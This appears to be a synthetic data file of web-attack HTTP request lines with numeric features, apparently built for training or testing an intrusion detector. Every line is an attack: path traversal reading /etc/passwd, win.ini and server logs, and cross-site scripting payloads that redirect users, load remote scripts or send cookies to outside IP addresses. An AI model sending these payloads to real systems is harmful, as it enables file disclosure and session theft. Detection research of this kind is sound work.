59,1,200,5310,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,5408,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,1699,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,7543,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,1187,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,3342,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,3426,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,6491,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,7192,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,5280,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,5865,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
80,1,200,5649,7,38,14,5,2,GET /?file=<script>window.location.href="http://62.201.139.39"</script> HTTP/1.1
84,1,200,2372,7,31,17,6,2,GET /?name=<script><script+src="http://133.167.162.227/731915.js=></script> HTTP/1.1
82,1,200,2065,7,31,17,6,2,GET /?file=<script><script+src="http://133.193.5.134/788151.js=></script> HTTP/1.1
102,1,200,7294,7,56,19,6,2,GET /?search=<script>window.location='http://112.88.52.193/?cookie='+document.cookie</script> HTTP/1.1
48,1,200,3361,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,3222,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,6284,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,4827,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,3902,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,6875,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,2527,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,3323,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,5403,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,5176,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,3025,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,2495,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,3473,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
96,1,200,4712,7,51,19,6,2,GET /?p=<script>window.location='http://81.87.251.34/?cookie='+document.cookie</script> HTTP/1.1
35,1,200,6470,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,7221,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,3541,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,7652,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,5975,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,1803,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,7425,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,2044,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,2798,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6273,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,7232,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6913,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
48,1,200,7826,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,6247,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,2460,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,3323,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,1337,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,2433,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,4532,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,7626,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,4462,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,2932,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
101,1,200,2707,7,54,19,6,2,GET /?name=<script>window.location='http://53.194.206.218/?cookie='+document.cookie</script> HTTP/1.1
50,1,200,3321,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,7024,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2349,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,5224,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,5797,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1884,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2306,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1052,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2502,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,7762,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2035,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,7051,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1917,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,7745,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2111,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1967,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,7828,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,3851,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1177,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,4626,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2219,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,5116,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
78,1,200,1897,7,35,14,5,2,GET /?p=<script>window.location.href="http://198.213.36.107"</script> HTTP/1.1
57,1,200,3255,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,5582,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,6340,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,2842,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,6056,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,2030,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,6689,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,4376,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,3566,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,3223,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,7189,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,4601,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,7798,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1324,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,4328,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,7354,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1733,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,7200,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1930,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
81,1,200,2904,8,30,16,6,2,GET /?file=<script>%window.open('http://90.144.22.233/994596')3C/script> HTTP/1.1
81,1,200,2310,7,38,14,5,2,GET /?name=<script>window.location.href="http://78.228.150.219"</script> HTTP/1.1
76,1,200,6380,7,35,14,5,2,GET /?p=<script>window.location.href="http://204.61.60.65"</script> HTTP/1.1
83,1,200,4426,8,30,16,6,2,GET /?file=<script>%window.open('http://119.204.153.187/846767')3C/script> HTTP/1.1
79,1,200,5921,7,38,14,5,2,GET /?name=<script>window.location.href="http://181.14.38.96"</script> HTTP/1.1
84,1,200,1343,8,32,16,6,2,GET /?search=<script>%window.open('http://168.127.190.202/48477')3C/script> HTTP/1.1
97,1,200,3975,7,51,19,6,2,GET /?p=<script>window.location='http://238.153.0.139/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,4796,7,54,19,6,2,GET /?name=<script>window.location='http://44.68.166.159/?cookie='+document.cookie</script> HTTP/1.1
76,1,200,2380,8,27,16,6,2,GET /?p=<script>%window.open('http://25.1.150.249/39330')3C/script> HTTP/1.1
83,1,200,1351,8,30,16,6,2,GET /?name=<script>%window.open('http://145.231.255.196/100393')3C/script> HTTP/1.1
47,1,200,5557,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,5906,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,7226,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,2466,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,4381,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,4901,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,3973,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,6353,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,3741,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,4566,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,6743,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
80,1,200,3235,7,38,14,5,2,GET /?name=<script>window.location.href="http://49.18.139.231"</script> HTTP/1.1
102,1,200,3782,7,54,19,6,2,GET /?file=<script>window.location='http://144.138.199.104/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,4846,8,30,16,6,2,GET /?file=<script>%window.open('http://79.155.72.38/908820')3C/script> HTTP/1.1
84,1,200,2632,8,32,16,6,2,GET /?search=<script>%window.open('http://42.198.138.170/397751')3C/script> HTTP/1.1
83,1,200,2647,7,31,17,6,2,GET /?name=<script><script+src="http://124.162.193.14/916115.js=></script> HTTP/1.1
60,1,200,5254,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,3879,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,1654,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,1088,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,5303,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,2678,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,6810,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7963,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7834,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7138,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7068,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,5893,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,5244,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
83,1,200,1527,8,32,16,6,2,GET /?search=<script>%window.open('http://39.131.222.19/808215')3C/script> HTTP/1.1
83,1,200,7414,8,32,16,6,2,GET /?search=<script>%window.open('http://19.202.10.233/825595')3C/script> HTTP/1.1
94,1,200,5150,7,51,19,6,2,GET /?p=<script>window.location='http://24.41.4.37/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,2747,8,27,16,6,2,GET /?p=<script>%window.open('http://142.169.235.158/865415')3C/script> HTTP/1.1
99,1,200,4711,7,54,19,6,2,GET /?file=<script>window.location='http://102.28.14.76/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,2754,8,30,16,6,2,GET /?name=<script>%window.open('http://63.180.190.119/476075')3C/script> HTTP/1.1
101,1,200,7292,7,54,19,6,2,GET /?file=<script>window.location='http://230.14.205.104/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,7022,7,40,14,5,2,GET /?search=<script>window.location.href="http://87.111.27.255"</script> HTTP/1.1
100,1,200,7818,7,54,19,6,2,GET /?name=<script>window.location='http://189.3.181.186/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,7372,7,38,14,5,2,GET /?name=<script>window.location.href="http://142.14.146.230"</script> HTTP/1.1
85,1,200,4220,8,32,16,6,2,GET /?search=<script>%window.open('http://198.129.150.142/300361')3C/script> HTTP/1.1
101,1,200,4686,7,54,19,6,2,GET /?name=<script>window.location='http://215.73.174.245/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,7544,7,31,17,6,2,GET /?name=<script><script+src="http://52.84.19.77/560770.js=></script> HTTP/1.1
84,1,200,3681,7,31,17,6,2,GET /?name=<script><script+src="http://132.250.139.191/756207.js=></script> HTTP/1.1
100,1,200,5966,7,54,19,6,2,GET /?name=<script>window.location='http://85.235.188.71/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,7400,7,33,17,6,2,GET /?search=<script><script+src="http://113.68.44.206/83577.js=></script> HTTP/1.1
78,1,200,7199,7,35,14,5,2,GET /?p=<script>window.location.href="http://77.226.250.182"</script> HTTP/1.1
97,1,200,1937,7,51,19,6,2,GET /?p=<script>window.location='http://239.93.141.64/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,2755,8,30,16,6,2,GET /?file=<script>%window.open('http://8.233.24.211/472975')3C/script> HTTP/1.1
77,1,200,1625,7,35,14,5,2,GET /?p=<script>window.location.href="http://217.84.65.110"</script> HTTP/1.1
102,1,200,7260,7,54,19,6,2,GET /?file=<script>window.location='http://100.148.215.105/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,6338,7,54,19,6,2,GET /?name=<script>window.location='http://76.122.44.104/?cookie='+document.cookie</script> HTTP/1.1
76,1,200,6300,8,27,16,6,2,GET /?p=<script>%window.open('http://98.53.129.69/74080')3C/script> HTTP/1.1
100,1,200,6626,7,54,19,6,2,GET /?name=<script>window.location='http://48.122.173.63/?cookie='+document.cookie</script> HTTP/1.1
99,1,200,7949,7,54,19,6,2,GET /?name=<script>window.location='http://48.86.15.123/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,7673,7,31,17,6,2,GET /?name=<script><script+src="http://190.40.247.150/829253.js=></script> HTTP/1.1
80,1,200,2669,7,31,17,6,2,GET /?file=<script><script+src="http://130.224.6.10/50866.js=></script> HTTP/1.1
82,1,200,5590,8,30,16,6,2,GET /?file=<script>%window.open('http://154.36.102.162/461056')3C/script> HTTP/1.1
80,1,200,1774,7,38,14,5,2,GET /?name=<script>window.location.href="http://15.200.113.31"</script> HTTP/1.1
79,1,200,2513,7,31,17,6,2,GET /?file=<script><script+src="http://142.8.3.47/504232.js=></script> HTTP/1.1
103,1,200,2868,7,56,19,6,2,GET /?search=<script>window.location='http://34.129.187.184/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,3920,7,54,19,6,2,GET /?file=<script>window.location='http://83.202.103.30/?cookie='+document.cookie</script> HTTP/1.1
102,1,200,1799,7,56,19,6,2,GET /?search=<script>window.location='http://180.94.151.25/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,2865,7,28,17,6,2,GET /?p=<script><script+src="http://146.41.5.154/145817.js=></script> HTTP/1.1
96,1,200,3905,7,51,19,6,2,GET /?p=<script>window.location='http://6.129.75.253/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,7618,8,32,16,6,2,GET /?search=<script>%window.open('http://235.244.25.215/831605')3C/script> HTTP/1.1
80,1,200,3015,7,38,14,5,2,GET /?name=<script>window.location.href="http://86.41.224.124"</script> HTTP/1.1
83,1,200,7673,8,30,16,6,2,GET /?file=<script>%window.open('http://162.182.224.205/457045')3C/script> HTTP/1.1
83,1,200,3150,7,31,17,6,2,GET /?file=<script><script+src="http://153.145.18.136/920618.js=></script> HTTP/1.1
84,1,200,3607,7,31,17,6,2,GET /?name=<script><script+src="http://224.247.225.185/438524.js=></script> HTTP/1.1
79,1,200,2482,8,27,16,6,2,GET /?p=<script>%window.open('http://24.116.200.219/543741')3C/script> HTTP/1.1
102,1,200,7132,7,54,19,6,2,GET /?name=<script>window.location='http://237.157.171.177/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,6252,8,30,16,6,2,GET /?name=<script>%window.open('http://84.35.2.178/826086')3C/script> HTTP/1.1
82,1,200,6458,7,40,14,5,2,GET /?search=<script>window.location.href="http://81.206.168.53"</script> HTTP/1.1
82,1,200,6482,7,38,14,5,2,GET /?file=<script>window.location.href="http://119.153.142.197"</script> HTTP/1.1
80,1,200,7666,8,27,16,6,2,GET /?p=<script>%window.open('http://205.226.168.232/536630')3C/script> HTTP/1.1
95,1,200,4838,7,51,19,6,2,GET /?p=<script>window.location='http://2.16.188.11/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,5121,7,38,14,5,2,GET /?name=<script>window.location.href="http://63.75.10.245"</script> HTTP/1.1
102,1,200,1551,7,56,19,6,2,GET /?search=<script>window.location='http://147.73.119.30/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,3011,7,28,17,6,2,GET /?p=<script><script+src="http://146.27.108.189/469986.js=></script> HTTP/1.1
80,1,200,7910,7,38,14,5,2,GET /?file=<script>window.location.href="http://167.96.191.89"</script> HTTP/1.1
79,1,200,3644,7,35,14,5,2,GET /?p=<script>window.location.href="http://161.129.125.227"</script> HTTP/1.1
102,1,200,4594,7,56,19,6,2,GET /?search=<script>window.location='http://178.204.34.15/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,5774,7,31,17,6,2,GET /?name=<script><script+src="http://132.184.49.190/908479.js=></script> HTTP/1.1
81,1,200,7552,8,30,16,6,2,GET /?file=<script>%window.open('http://203.6.118.136/812020')3C/script> HTTP/1.1
99,1,200,1450,7,51,19,6,2,GET /?p=<script>window.location='http://216.199.132.211/?cookie='+document.cookie</script> HTTP/1.1
98,1,200,6890,7,51,19,6,2,GET /?p=<script>window.location='http://231.78.239.185/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,1181,7,54,19,6,2,GET /?file=<script>window.location='http://152.7.165.147/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,6613,7,54,19,6,2,GET /?name=<script>window.location='http://11.187.14.119/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,7909,8,27,16,6,2,GET /?p=<script>%window.open('http://124.102.110.190/650567')3C/script> HTTP/1.1
80,1,200,1404,8,30,16,6,2,GET /?name=<script>%window.open('http://181.0.186.99/983152')3C/script> HTTP/1.1
81,1,200,1541,7,40,14,5,2,GET /?search=<script>window.location.href="http://40.12.11.168"</script> HTTP/1.1
96,1,200,7150,7,51,19,6,2,GET /?p=<script>window.location='http://104.0.63.198/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,7244,7,54,19,6,2,GET /?name=<script>window.location='http://133.53.137.92/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,3791,8,32,16,6,2,GET /?search=<script>%window.open('http://255.213.202.55/937133')3C/script> HTTP/1.1
101,1,200,3200,7,54,19,6,2,GET /?file=<script>window.location='http://93.239.138.248/?cookie='+document.cookie</script> HTTP/1.1
96,1,200,6033,7,51,19,6,2,GET /?p=<script>window.location='http://168.44.42.56/?cookie='+document.cookie</script> HTTP/1.1
103,1,200,2592,7,56,19,6,2,GET /?search=<script>window.location='http://153.53.108.100/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,1702,7,35,14,5,2,GET /?p=<script>window.location.href="http://99.211.217.223"</script> HTTP/1.1
83,1,200,6391,7,40,14,5,2,GET /?search=<script>window.location.href="http://93.186.162.147"</script> HTTP/1.1
80,1,200,6128,7,38,14,5,2,GET /?name=<script>window.location.href="http://19.45.137.134"</script> HTTP/1.1
77,1,200,7586,7,35,14,5,2,GET /?p=<script>window.location.href="http://178.8.247.159"</script> HTTP/1.1
78,1,200,2609,7,35,14,5,2,GET /?p=<script>window.location.href="http://153.50.152.251"</script> HTTP/1.1
99,1,200,2146,7,54,19,6,2,GET /?name=<script>window.location='http://42.205.19.37/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,1650,7,38,14,5,2,GET /?name=<script>window.location.href="http://157.101.94.77"</script> HTTP/1.1
84,1,200,1825,7,33,17,6,2,GET /?search=<script><script+src="http://85.203.138.91/534893.js=></script> HTTP/1.1
97,1,200,5161,7,51,19,6,2,GET /?p=<script>window.location='http://1.239.122.189/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,4907,7,38,14,5,2,GET /?file=<script>window.location.href="http://130.139.243.203"</script> HTTP/1.1
79,1,200,2597,8,30,16,6,2,GET /?file=<script>%window.open('http://36.85.106.57/86392')3C/script> HTTP/1.1
82,1,200,7740,7,38,14,5,2,GET /?file=<script>window.location.href="http://138.161.121.136"</script> HTTP/1.1
100,1,200,2973,7,54,19,6,2,GET /?file=<script>window.location='http://76.230.109.21/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,4867,7,38,14,5,2,GET /?name=<script>window.location.href="http://255.198.151.175"</script> HTTP/1.1
84,1,200,1428,7,33,17,6,2,GET /?search=<script><script+src="http://238.91.209.20/661661.js=></script> HTTP/1.1
80,1,200,2735,7,38,14,5,2,GET /?file=<script>window.location.href="http://83.186.76.238"</script> HTTP/1.1
104,1,200,7937,7,56,19,6,2,GET /?search=<script>window.location='http://101.185.198.218/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,4984,7,31,17,6,2,GET /?file=<script><script+src="http://56.83.39.60/249180.js=></script> HTTP/1.1
83,1,200,2137,8,32,16,6,2,GET /?search=<script>%window.open('http://206.46.18.130/857368')3C/script> HTTP/1.1
80,1,200,1079,7,38,14,5,2,GET /?file=<script>window.location.href="http://15.136.253.50"</script> HTTP/1.1
104,1,200,2649,7,56,19,6,2,GET /?search=<script>window.location='http://158.180.167.177/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,1103,8,32,16,6,2,GET /?search=<script>%window.open('http://102.205.33.58/228445')3C/script> HTTP/1.1
85,1,200,4837,7,33,17,6,2,GET /?search=<script><script+src="http://217.186.25.142/996259.js=></script> HTTP/1.1
78,1,200,5421,8,27,16,6,2,GET /?p=<script>%window.open('http://161.14.81.248/532871')3C/script> HTTP/1.1
83,1,200,1689,7,40,14,5,2,GET /?search=<script>window.location.href="http://209.123.63.167"</script> HTTP/1.1
80,1,200,5433,7,38,14,5,2,GET /?name=<script>window.location.href="http://156.25.158.68"</script> HTTP/1.1
84,1,200,4180,7,40,14,5,2,GET /?search=<script>window.location.href="http://239.117.191.155"</script> HTTP/1.1
78,1,200,1435,8,30,16,6,2,GET /?file=<script>%window.open('http://25.105.3.190/3073')3C/script> HTTP/1.1
102,1,200,3186,7,54,19,6,2,GET /?name=<script>window.location='http://252.100.106.243/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,1988,8,32,16,6,2,GET /?search=<script>%window.open('http://57.249.224.215/413657')3C/script> HTTP/1.1
81,1,200,4781,7,38,14,5,2,GET /?file=<script>window.location.href="http://102.151.116.86"</script> HTTP/1.1
97,1,200,1448,7,51,19,6,2,GET /?p=<script>window.location='http://143.14.24.106/?cookie='+document.cookie</script> HTTP/1.1
76,1,200,1038,7,35,14,5,2,GET /?p=<script>window.location.href="http://82.109.83.65"</script> HTTP/1.1
82,1,200,3744,8,30,16,6,2,GET /?name=<script>%window.open('http://211.144.142.59/498479')3C/script> HTTP/1.1
83,1,200,7588,7,33,17,6,2,GET /?search=<script><script+src="http://184.12.9.254/144170.js=></script> HTTP/1.1
81,1,200,3264,7,31,17,6,2,GET /?file=<script><script+src="http://85.58.129.48/555141.js=></script> HTTP/1.1
98,1,200,2062,7,51,19,6,2,GET /?p=<script>window.location='http://49.103.136.183/?cookie='+document.cookie</script> HTTP/1.1
85,1,200,2600,7,33,17,6,2,GET /?search=<script><script+src="http://150.213.31.234/319450.js=></script> HTTP/1.1
80,1,200,7709,7,38,14,5,2,GET /?name=<script>window.location.href="http://92.138.67.150"</script> HTTP/1.1
80,1,200,5577,8,30,16,6,2,GET /?file=<script>%window.open('http://96.228.246.9/199268')3C/script> HTTP/1.1
82,1,200,4217,7,38,14,5,2,GET /?name=<script>window.location.href="http://173.204.109.255"</script> HTTP/1.1
83,1,200,1370,7,40,14,5,2,GET /?search=<script>window.location.href="http://231.181.169.24"</script> HTTP/1.1
99,1,200,4730,7,51,19,6,2,GET /?p=<script>window.location='http://246.153.107.105/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,4774,7,38,14,5,2,GET /?file=<script>window.location.href="http://128.242.92.207"</script> HTTP/1.1
82,1,200,5164,7,31,17,6,2,GET /?file=<script><script+src="http://250.8.182.246/306024.js=></script> HTTP/1.1
83,1,200,4241,8,32,16,6,2,GET /?search=<script>%window.open('http://132.108.241.89/19941')3C/script> HTTP/1.1
101,1,200,6066,7,54,19,6,2,GET /?file=<script>window.location='http://145.126.46.152/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,7834,8,30,16,6,2,GET /?file=<script>%window.open('http://27.46.7.185/636579')3C/script> HTTP/1.1
81,1,200,3731,7,31,17,6,2,GET /?file=<script><script+src="http://92.28.50.174/695382.js=></script> HTTP/1.1
81,1,200,3099,7,38,14,5,2,GET /?file=<script>window.location.href="http://136.65.192.243"</script> HTTP/1.1
83,1,200,7092,8,32,16,6,2,GET /?search=<script>%window.open('http://131.41.196.26/686977')3C/script> HTTP/1.1
101,1,200,1495,7,54,19,6,2,GET /?file=<script>window.location='http://245.80.119.154/?cookie='+document.cookie</script> HTTP/1.1
